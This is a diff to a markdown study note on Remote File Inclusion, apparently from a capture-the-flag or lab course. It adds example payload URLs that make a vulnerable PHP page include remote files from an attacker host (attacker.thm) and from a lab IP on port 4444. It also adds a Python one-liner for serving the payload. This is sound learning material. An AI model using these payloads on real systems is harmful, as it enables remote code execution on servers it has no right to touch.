@@ -81,4 +81,8 @@ In RFI, one can inject an external URL into `include` function. But one requirem
 - Denial of Service (DoS)
 
 ![image](https://github.com/PranjalBasak/Documentation/assets/66166653/9ed4aa3d-d153-403e-8f01-abc62626637e)
- Example Payload: `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
+ Example Payload: 
+ - `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
+ -  `http://10.10.233.114/playground.php?file=http://10.17.42.103:4444/46635.py`
+
+**Running A Simple HTTP Server Using Python3:** `python3 -m http.server 9000`
